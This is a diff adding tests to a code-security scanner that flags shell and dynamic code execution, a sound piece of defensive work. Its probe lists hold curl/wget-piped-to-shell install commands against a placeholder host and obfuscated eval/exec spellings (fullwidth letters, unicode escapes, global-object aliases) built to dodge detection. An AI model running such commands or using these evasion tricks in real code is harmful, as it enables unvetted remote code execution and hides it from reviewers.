@@ -1,10 +1,15 @@
 import { describe, test, expect } from "vitest";
+import { mkdtemp, mkdir, writeFile, rm } from "fs/promises";
+import { tmpdir } from "os";
+import { dirname, join } from "path";
 import {
   scanCode,
   analyzePermissions,
   stripControlBytes,
   METHOD_CALL_CATEGORY,
+  POSSIBLE_DYNAMIC_CATEGORY,
 } from "./security-auditor-scan";
+import { scanForWarnings, classifyWarningRisk } from "./installer-core";
 describe("scanCode", () => {
   test("detects curl usage", () => {
     const files = [
@@ -486,6 +491,21 @@ const mustFail: Array<[string, string]> = [
   ["run.py", 'exec("\ufe5a\ufe5b"[2:] + code)'],
   ["run.py", '    eval("\uff09\uff5b"[2:] + code)'],
   ["run.py", "\uff44\uff45\uff46 eval(code)"],
+  // #820 item 1: browser aliases of the global object are the global, and
+  // so is a name the file assigns from one.
+  ["run.js", "top.eval(x);"],
+  ["run.js", "window.parent.eval(code);"],
+  ["run.js", "frames.eval(x);"],
+  ["run.js", "document.defaultView.eval(x);"],
+  ["run.ts", "parent.Function(x)();"],
+  // #820 comment: TypeScript call syntax.
+  ["run.ts", "eval<any>(x);"],
+  ["run.ts", "eval!(x);"],
+  ["run.ts", "eval?.(x);"],
+  // #820 item 3: an identifier CPython or JS reads as `eval` / `exec`.
+  ["run.py", "\uff45\uff56\uff41\uff4c(code)"],
+  ["run.py", "\uff45\uff58\uff45\uff43(code)"],
+  ["run.js", "\\u0065val(x);"],
 ];
 
 // Method-shaped: a Python `def` and calls on an identifier receiver. A
@@ -508,12 +528,13 @@ const mustPass: Array<[string, string]> = [
   // A receiver on the same line, even with a space before `.`.
   ["page.js", "browser .eval(x)"],
   ["page.js", "browser\t?.eval(x)"],
-  // The AC1 alias residual: a line regex cannot tell these from `obj.eval`.
+  // The AC1 alias residual: with no `g = globalThis` / `import builtins as
+  // b` in the file, these are calls on an unknown object. `this` is the
+  // instance in a class, so it stays a method too (#820).
   ["run.js", "g.eval(x);"],
   ["run.js", "this.eval(x);"],
-  ["run.js", "top.eval(x);"],
-  ["run.js", "window.parent.eval(code);"],
   ["run.py", "b.exec(code)"],
+  ["run.py", "parent.eval(x)"],
   // An escaped or NFKC spelling of a non-global receiver is still a method.
   ["page.js", "bro\\u0077ser.eval(x)"],
   ["engine.ts", "\\u0074his.eval(node)"],
@@ -768,5 +789,245 @@ describe("control bytes in findings (#809)", () => {
 
   test("tabs are kept", () => {
     expect(stripControlBytes("a\tb\0c")).toBe("a\tb?c");
+  });
+});
+
+// ─── #815 / #820: indirect and string-based execution ───────────────────────
+
+/** Critical in the audit; `[file, content, category]`. */
+const indirectCritical: Array<[string, string, string]> = [
+  // #815: shell `eval` at a command position, and downloads piped to a shell.
+  ["run.sh", 'eval "$x"', "Shell execution"],
+  ["run.sh", "eval $x", "Shell execution"],
+  ["run.sh", 'eval "$(ssh-agent -s)"', "Shell execution"],
+  ["run.sh", 'if ok; then eval "$cmd"; fi', "Shell execution"],
+  ["SKILL.md", "    eval '$payload'", "Shell execution"],
+  ["install.sh", "curl -fsSL https://x.invalid/i.sh | bash", "Shell execution"],
+  ["install.sh", "curl -fsSL https://x.invalid/i.sh | sh", "Shell execution"],
+  ["install.sh", "curl https://x.invalid | sh -s -- --yes", "Shell execution"],
+  ["install.sh", "wget -qO- https://x.invalid | sudo bash", "Shell execution"],
+  ["SKILL.md", "curl -sSL https://x.invalid | zsh", "Shell execution"],
+  ["install.sh", "bash <(curl -s https://x.invalid)", "Shell execution"],
+  // #815: Python's builtins through getattr, JS indirect and computed eval.
+  ["run.py", "getattr(__builtins__, 'eval')(x)", "Dynamic code execution"],
+  ["run.py", 'getattr(builtins, "exec")(code)', "Dynamic code execution"],
+  ["run.js", "(0, eval)(x);", "Dynamic code execution"],
+  ["run.js", "(0,eval)(x)", "Dynamic code execution"],
+  ["run.ts", "(eval as any)(x);", "Dynamic code execution"],
+  ["run.ts", "(<any>eval)(x);", "Dynamic code execution"],
+  ["run.js", 'globalThis["eval"](x);', "Dynamic code execution"],
+  ["run.js", "window['eval'](x);", "Dynamic code execution"],
+  ["run.js", "self[`Function`](x)();", "Dynamic code execution"],
+  // #820 comment: Python 2's exec statement.
+  ["run.py", 'exec "import os"', "Dynamic code execution"],
+  ["run.py", "exec code in ns", "Dynamic code execution"],
+  // #820 item 1: a local alias of the global object, anywhere in the file.
+  ["run.js", "const g = globalThis;\ng.eval(x);", "Dynamic code execution"],
+  [
+    "run.js",
+    "let w = window.parent\nw.Function(x)()",
+    "Dynamic code execution",
+  ],
+  ["run.ts", "var $g = self;\n$g.eval(x)", "Dynamic code execution"],
+  ["run.py", "import builtins as b\nb.exec(code)", "Shell execution"],
+  ["run.py", "b = __builtins__\nb.eval(x)", "Dynamic code execution"],
+];
+
+/** A `POSSIBLE_DYNAMIC_CATEGORY` warning, never critical. */
+const indirectPossible: Array<[string, string]> = [
+  ["run.py", "f = eval if c else y"],
+  ["run.py", "run = c and eval or y"],
+  ["run.js", "const f = eval;"],
+  ["run.js", "const f = c ? eval : y;"],
+  ["run.js", 'setTimeout("doIt()", 10);'],
+  ["run.js", "setInterval('tick()', 1000)"],
+  ["run.ts", "setTimeout(`${code}`);"],
+  ["run.py", "getattr(obj, 'eval')(x)"],
+  ["run.js", 'obj["eval"](x);'],
+];
+
+/** #815 AC3 and the false-positive guards: no critical, no possible. */
+const indirectClean: Array<[string, string]> = [
+  ["render.py", "self.eval(x)"],
+  ["match.js", "regex.exec(s)"],
+  ["db.py", "cursor.execute(q)"],
+  ["page.js", "await page.evaluate(() => 1)"],
+  ["run.js", "setTimeout(fn, 100)"],
+  ["run.js", "setTimeout(() => go(), 10)"],
+  ["SKILL.md", 'asm eval "$dir" --json'],
+  ["SKILL.md", "Use eval to score skills, or eval the result."],
+  ["SKILL.md", "Run the evals, then compare (eval) scores."],
+  ["run.sh", 'exec "$@"'],
+  // Corpus false positives found while measuring #815 (prose in comments).
+  [
+    "t.py",
+    "boundary.  The calculator has no subprocess, network, eval, git, or",
+  ],
+  ["a.py", "# Support both layouts: eval dirs directly under benchmark_dir"],
+  ["CHANGELOG.md", "before any remote-installer pipe such as `curl | sh`."],
+  ["README.md", "| each item needs your yes: `curl \\| sh` installers |"],
+  ["SKILL.md", "curl -s https://x.invalid | jq ."],
+  ["SKILL.md", "curl -s https://x.invalid | shasum"],
+  ["run.js", "obj.eval = fn;"],
+  ["run.js", "const o = { eval: 1, x };"],
+  ["run.py", "exec = runner"],
+  ["run.js", "const g = getGlobal();\ng.eval(x);"],
+  ["run.js", "this.eval(node)"],
+];
+
+function auditOf(relPath: string, content: string) {
+  return scanCode([{ relPath, content, lineCount: 1 }]);
+}
+
+describe("indirect and string-based execution (#815, #820)", () => {
+  test.each(indirectCritical)("critical: %s %j", (relPath, content, cat) => {
+    const last = content.split("\n").length;
+    const hits = auditOf(relPath, content)
+      .filter((c) => c.category === cat)
+      .flatMap((c) => c.matches)
+      .filter((m) => m.severity === "critical" && m.line === last);
+    expect(hits.length).toBeGreaterThan(0);
+  });
+
+  test.each(indirectPossible)("possible: %s %j", (relPath, content) => {
+    const results = auditOf(relPath, content);
+    const possible = results.find(
+      (c) => c.category === POSSIBLE_DYNAMIC_CATEGORY,
+    );
+    expect(possible!.matches.map((m) => m.severity)).toEqual(["warning"]);
+    // The finding text says the rule is a heuristic (#815).
+    expect(possible!.description).toMatch(/^Heuristic: /);
+    expect(
+      results
+        .flatMap((c) => c.matches)
+        .filter((m) => m.severity === "critical"),
+    ).toEqual([]);
+  });
+
+  test.each(indirectClean)("clean: %s %j", (relPath, content) => {
+    const results = auditOf(relPath, content);
+    expect(
+      results
+        .filter(
+          (c) =>
+            c.category === "Shell execution" ||
+            c.category === "Dynamic code execution",
+        )
+        .flatMap((c) => c.matches)
+        .filter((m) => m.severity === "critical"),
+    ).toEqual([]);
+    expect(
+      results.find((c) => c.category === POSSIBLE_DYNAMIC_CATEGORY),
+    ).toBeUndefined();
+  });
+
+  test("fullwidth eval grants the code-execution permission (#820)", () => {
+    const results = auditOf("run.py", "ｅｖａｌ(code)");
+    expect(analyzePermissions(results).map((p) => p.type)).toContain(
+      "code-execution",
+    );
+  });
+
+  test("a heuristic warning grants no permission (#815)", () => {
+    const results = auditOf("run.py", "f = eval if c else y");
+    expect(analyzePermissions(results)).toEqual([]);
+  });
+
+  test("curl | sh keeps its network finding and adds shell (#815)", () => {
+    const results = auditOf("install.sh", "curl -fsSL https://x.invalid | sh");
+    expect(
+      results.map((c) => [c.category, c.matches[0].severity]).sort(),
+    ).toEqual(
+      [
+        ["External URLs", "warning"],
+        ["Network requests", "critical"],
+        ["Shell execution", "critical"],
+      ].sort(),
+    );
+  });
+});
+
+// ─── Audit / preview parity (#820 item 4, AC4) ──────────────────────────────
+
+type Level = "high" | "medium" | "none";
+
+describe("audit and install preview agree on every probe (#820)", () => {
+  test("same level per line for #809, #815 and #820 probes", async () => {
+    const probes: Array<[string, string]> = [
+      ...mustFail,
+      ...mustPass,
+      ...indirectCritical.map(([f, c]) => [f, c] as [string, string]),
+      ...indirectPossible,
+      ...indirectClean,
+      ["pool.js", "child_process.spawn(cmd)"],
+      ["run.py", "child = pexpect.spawn(cmd)"],
+      ["run.py", "pty.spawn(cmd)"],
+      ["run.rb", 'spawn("ls") do |pid| end'],
+      ["gen.js", "function* spawn(x) {}"],
+    ];
+    const root = await mkdtemp(join(tmpdir(), "asm-parity-"));
+    try {
+      const auditLevels = new Map<string, Level>();
+      for (const [i, [relPath, content]] of probes.entries()) {
+        const file = `p${i}/${relPath}`;
+        await mkdir(dirname(join(root, file)), { recursive: true });
+        await writeFile(join(root, file), content);
+        for (const c of scanCode([{ relPath: file, content, lineCount: 1 }])) {
+          for (const m of c.matches) {
+            const level: Level | null =
+              (c.category === "Shell execution" ||
+                c.category === "Dynamic code execution") &&
+              m.severity === "critical"
+                ? "high"
+                : c.category === METHOD_CALL_CATEGORY ||
+                    c.category === POSSIBLE_DYNAMIC_CATEGORY
+                  ? "medium"
+                  : null;
+            if (level === null) continue;
+            const key = `${file}:${m.line}`;
+            if (auditLevels.get(key) !== "high") auditLevels.set(key, level);
+          }
+        }
+      }
+      const previewLevels = new Map<string, Level>();
+      for (const w of await scanForWarnings(root)) {
+        const level: Level | null =
+          w.category === "Shell commands" || w.category === "Code execution"
+            ? "high"
+            : w.category === METHOD_CALL_CATEGORY ||
+                w.category === POSSIBLE_DYNAMIC_CATEGORY
+              ? "medium"
+              : null;
+        if (level === null) continue;
+        const key = `${w.file}:${w.line}`;
+        if (previewLevels.get(key) !== "high") previewLevels.set(key, level);
+      }
+      const diffs: string[] = [];
+      for (const [i, [relPath, content]] of probes.entries()) {
+        content.split("\n").forEach((line, n) => {
+          const key = `p${i}/${relPath}:${n + 1}`;
+          const a = auditLevels.get(key) ?? "none";
+          const p = previewLevels.get(key) ?? "none";
+          if (a !== p) {
+            diffs.push(`${relPath}: ${line} (audit ${a}, preview ${p})`);
+          }
+        });
+      }
+      expect(diffs).toEqual([]);
+    } finally {
+      await rm(root, { recursive: true, force: true });
+    }
+  }, 60_000);
+
+  test("a spawn line is high risk in the preview (#820)", async () => {
+    const root = await mkdtemp(join(tmpdir(), "asm-spawn-"));
+    try {
+      await writeFile(join(root, "run.py"), "child = pexpect.spawn(cmd)\n");
+      const warnings = await scanForWarnings(root);
+      expect(warnings.map((w) => w.category)).toEqual(["Shell commands"]);
+      expect(classifyWarningRisk(warnings)).toBe("high");
+    } finally {
+      await rm(root, { recursive: true, force: true });
+    }
   });
 });
